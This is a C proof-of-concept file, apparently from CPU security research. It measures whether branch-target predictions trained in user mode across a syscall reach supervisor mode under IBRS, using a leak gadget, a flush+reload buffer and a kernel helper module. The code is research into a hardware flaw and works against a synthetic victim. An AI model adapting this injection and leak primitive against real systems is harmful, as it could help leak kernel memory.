// SPDX-License-Identifier: GPL-3.0-only
/*
 * Demonstrate how the delay of the privilege switch affects the privilege
 * mode where a prediction is available
 */

#include <err.h>
#include <syscall.h>
#include <unistd.h>

#include "ap_ioctl.h"
#include "branch.h"
#include "memtools.h"
#include "msr.h"
#include "stats.h"

#define RB_OFFSET 0xcc0
#include "rb_tools.h"

#define SYS_INVALID (0x400) // invalid syscall number

#define MAX_NOPS 512
#define NUM_ROUNDS 200000 // 2 * 100000 because it is split over user and supervisor experiments
#define NOP_PREFIX 0x10000
#define RAND_HIST_SIZE 16

// alternative methods of delay

// #define DELAY_OP "mov $0, %rax\ncpuid\n"
// #define DELAY_OP_SIZE 9

// #define DELAY_OP "lfence\n"
// #define DELAY_OP_SIZE 3

#define DELAY_OP "nop\n"
#define DELAY_OP_SIZE 1

typedef struct registers
{
    u64 src_ptr;     // code snip that contains the jump instruction
    u64 dst_ptr_ptr; // jump target

    u64 memory_ptr;
} registers_t;

typedef struct exp_params
{
    u64 victim_src;
    u64 victim_src_cfi_label;
    u64 victim_src_size;
    u64 train_src;
    u64 train_src_cfi_label;
    u64 train_src_size;

    u64 num_nops_wait_1;

    u64 round;
} exp_params_t;

typedef struct run_params
{
    exp_params_t *exp_params;
    registers_t *train;
    registers_t *victim;
} run_params_t;

typedef struct exp_res
{
    u64 hits_btb;
} exp_res_t;

// clang-format off
extern unsigned char train_src_label_jump[];
mk_snip(train_src_jump,
    // space for randomized history
    ".rept " STR(NOP_PREFIX)"\n"
    "nop\n"
    ".endr\n"
    "clflush (%rbx)\n"
    "lfence\n"
    "train_src_label_jump:\n"
    "jmp *(%rbx)\n"
    "int3\n"
);

// clang-format off
extern unsigned char victim_src_label_jump[];
mk_snip(victim_src_jump,
    // space for randomized history
    ".rept " STR(NOP_PREFIX)"\n"
    "nop\n"
    ".endr\n"
    "clflush (%rbx)\n"
    "lfence\n"
    "victim_src_label_jump:\n"
    "jmp *(%rbx)\n"
    "int3\n"
);

// clang-format off
mk_snip(victim_gadget,
    // leak gadget
    "add $"STR(RB_OFFSET)", %rcx\n"
    "mov (%rcx), %rcx\n"
    "ret\n"
    "int3           \n"
);
// clang-format on

// clang-format off
mk_snip(victim_dst,
    "lfence\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

// clang-format off
extern unsigned char train_dst_gadget[];
mk_snip(train_dst,
    ".rept " STR(MAX_NOPS)"\n"
    DELAY_OP
    ".endr\n"
    "train_dst_gadget:\n"
    "lfence\n"
    // privilege domain change to induce branch privilige injection
    "syscall\n"
    ".rept 32\n"
    "nop\n"
    ".endr\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

void run_snip_call(void *v)
{
    struct registers *r = v;

    // clang-format off
    asm volatile(
        "call *%%rdx\n"
        :
        : "d"(r->src_ptr), "b"(r->dst_ptr_ptr), "c"(r->memory_ptr)
        : "r8", "memory", "flags");
    // clang-format on
}

const u64 dummy_memory;
struct ap_payload p;
void run_exp_once(run_params_t *params)
{
    // params
    registers_t *train = params->train;
    registers_t *victim = params->victim;

    p.fptr = run_snip_call;
    p.data = victim;

    rb_reset();

    // isolate the measurements from the setup
    for (volatile int i = 0; i < 100000; ++i)
        ;

    // First one round of warmup

    // randomizing branch histories
    u64 victim_src = victim->src_ptr;
    u64 train_src = train->src_ptr;
    victim->src_ptr = bhb_rand_nearjmp(victim_src, NOP_PREFIX, RAND_HIST_SIZE);
    train->src_ptr = bhb_rand_nearjmp(train_src, NOP_PREFIX, RAND_HIST_SIZE);

    // clang-format off
    // inject target
    asm volatile(
        "lea 1f(%%rip), %%r11\n"
        "pushq %%r11\n"
        "jmp *%0\n" 
        "1:"
        :
        : "r"(train->src_ptr), "b"(train->dst_ptr_ptr), "c"(_ul(&dummy_memory) - RB_OFFSET)
        , "a"(SYS_INVALID)
        : "r11");

    // run the victim using the ioctl syscall
    asm volatile(
        "syscall\n"
        :
        : "a"(SYS_ioctl), "D"(fd_ap), "S"(AP_IOCTL_RUN), "d"(&p) // ioctl params to run victim
        : "rcx", "r11");
    // clang-format on

    // Then the actual measurement round

    // rerandomize
    victim->src_ptr = bhb_rand_nearjmp(victim_src, NOP_PREFIX, RAND_HIST_SIZE);
    train->src_ptr = bhb_rand_nearjmp(train_src, NOP_PREFIX, RAND_HIST_SIZE);

    // clang-format off
    asm volatile(
        "lea 1f(%%rip), %%r11\n"
        "pushq %%r11\n"
        "jmp *%0\n" 
        "1:"
        :
        : "r"(train->src_ptr), "b"(train->dst_ptr_ptr), "c"(_ul(&dummy_memory) - RB_OFFSET)
        , "a"(SYS_INVALID)
        : "r11");
    // clang-format on

    rb_flush();
    if (params->exp_params->round % 2 == 0)
    {
        // run the victim in supervisor mode
        // clang-format off
        asm volatile(
            "syscall\n"
            :
            : "a"(SYS_ioctl), "D"(fd_ap), "S"(AP_IOCTL_RUN), "d"(&p) // ioctl params to run victim
            : "r11");
        // clang-format on
    }
    else
    {
        // run the victim in usermode
        // clang-format off
        asm volatile(
            "call *%0\n"
            :
            : "r"(victim->src_ptr), "c"(victim->memory_ptr), "b"(victim->dst_ptr_ptr)
            :);
        // clang-format on
    }
    rb_reload();
}

int run_exp(exp_params_t *params, exp_res_t *exp_res)
{
    int err = 0;

    u64 num_nops_wait_1 = params->num_nops_wait_1;

    // build the set of code snippets in advance
    code_snip_t train_src_snip;
    code_snip_t train_dst_snip;
    code_snip_t victim_src_snip;
    code_snip_t victim_dst_snip;
    code_snip_t victim_gadget_snip;

    // create the victim we want to attack
    u64 victim_jmp_addr;
    u64 victim_src_addr;
    do
    {
        // location of victim jump
        victim_jmp_addr = rand47();
        // calculate start of victim snip so jmp has correct location
        victim_src_addr = victim_jmp_addr - (params->victim_src_cfi_label - params->victim_src);
    } while (map_code(&victim_src_snip, victim_src_addr, _ptr(params->victim_src), params->victim_src_size));

    // put the real victim target in a random location
    u64 victim_dst_addr;
    do
    {
        victim_dst_addr = rand47();
    } while (init_snip(&victim_dst_snip, victim_dst_addr, victim_dst));

    // create a gadget at a random but BTB predictable location
    u64 victim_gadget_addr;
    do
    {
        victim_gadget_addr = ((victim_jmp_addr & 0x7FFF00000000ul) | (rand47() & 0xFFFFFFFFul));
    } while (init_snip(&victim_gadget_snip, victim_gadget_addr, victim_gadget));

    // create training addrs
    u64 train_jmp_addr = (victim_jmp_addr & 0x40FFFFFFFFFFul) ^ 0x600000000000ul;
    u64 train_src_addr = train_jmp_addr - (params->train_src_cfi_label - params->train_src);
    if (map_code(&train_src_snip, train_src_addr, _ptr(params->train_src), params->train_src_size))
    {
        err = 1;
        goto cleanup_victim_gadget;
    }

    // create a training destination such that the upper bits match training source and the lower the victim gadget
    u64 train_dst_addr = (train_src_addr & 0x7FFF00000000ul) | (victim_gadget_addr & 0xFFFFFFFFul);
    u64 train_dst_snip_addr = train_dst_addr - (_ul(train_dst_gadget) - _ul(train_dst__snip)) + (DELAY_OP_SIZE * num_nops_wait_1);
    if (init_snip(&train_dst_snip, train_dst_snip_addr, train_dst))
    {
        err = 1;
        goto cleanup_train_src;
    }

    int secret = rand() % RB_SLOTS;

    registers_t train;
    registers_t victim;

    victim.src_ptr = victim_src_addr;
    victim.dst_ptr_ptr = _ul(&victim_dst_snip.ptr_u64); // set the target to wherever
    victim.memory_ptr = RB_PTR + secret * RB_STRIDE;

    u64 train_dst_ptr = train_dst_addr;
    train.src_ptr = train_src_addr;
    train.dst_ptr_ptr = _ul(&train_dst_ptr);
    train.memory_ptr = _ul(&dummy_memory) - RB_OFFSET;

    run_params_t run_params = {
        .exp_params = params,
        .train = &train,
        .victim = &victim,
    };

    run_exp_once(&run_params);

    exp_res->hits_btb = rb_hist[secret];

    junmap(&train_dst_snip);
cleanup_train_src:
    junmap(&train_src_snip);
cleanup_victim_gadget:
    junmap(&victim_gadget_snip);
    junmap(&victim_dst_snip);
    junmap(&victim_src_snip);

    return err;
}

u64 results_btb_supervisor[MAX_NOPS + 1] = {0};
u64 results_btb_user[MAX_NOPS + 1] = {0};
void evaluate_experiment(exp_params_t *params, char *label_prefix)
{
    INFO("running %s\n", label_prefix);
    fflush(stdout);

    // reset results
    memset(results_btb_supervisor, 0, sizeof(results_btb_supervisor));
    memset(results_btb_user, 0, sizeof(results_btb_user));

    // run for different amounts of delay
    for (u64 num_nops = 0; num_nops <= MAX_NOPS; num_nops++)
    {
        for (int r = 0; r < NUM_ROUNDS; ++r)
        {
            exp_res_t exp_res;

            params->round = r;
            params->num_nops_wait_1 = num_nops;
            if (run_exp(params, &exp_res))
            {
                // retry if there was an issue (i.e. addr generation)
                --r;
                continue;
            }

            // count the hits for the correct target
            if (params->round % 2 == 0)
            {
                results_btb_supervisor[num_nops] += exp_res.hits_btb >= 1 ? 1 : 0;
            }
            else
            {
                results_btb_user[num_nops] += exp_res.hits_btb >= 1 ? 1 : 0;
            }
        }

        printf("%snum_nops %03lu: ", label_prefix, num_nops);
        printf("result_btb_wait_supervisor: %04lu, ", results_btb_supervisor[num_nops]);
        printf("result_btb_wait_user: %04lu, ", results_btb_user[num_nops]);
        printf("\n");
        fflush(stdout);
    }

    // print statistics
    stats_results_start();
    printf("%s", label_prefix);
    stats_print_arr_u64("result_btb_wait_supervisor", results_btb_supervisor, MAX_NOPS + 1);
    printf("%s", label_prefix);
    stats_print_arr_u64("result_btb_wait_user", results_btb_user, MAX_NOPS + 1);
    stats_results_end();
    fflush(stdout);
}

int main(int argc, char *argv[])
{
    srandom(getpid());

    msr_init();
    rb_init();
    ap_init();

    INFO("finding leaks\n");

    // use consistent mitigations
    msr_params_t msr_params = {
        .msr_nr = MSR_IA32_SPEC_CTRL,
        .msr_value = IBRS_MASK,
    };
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);

    exp_params_t params_jump = {
        .victim_src = _ul(victim_src_jump__snip),
        .victim_src_cfi_label = _ul(victim_src_label_jump),
        .victim_src_size = snip_sz(victim_src_jump),
        .train_src = _ul(train_src_jump__snip),
        .train_src_cfi_label = _ul(train_src_label_jump),
        .train_src_size = snip_sz(train_src_jump),
    };
    evaluate_experiment(&params_jump, "jump_");
}
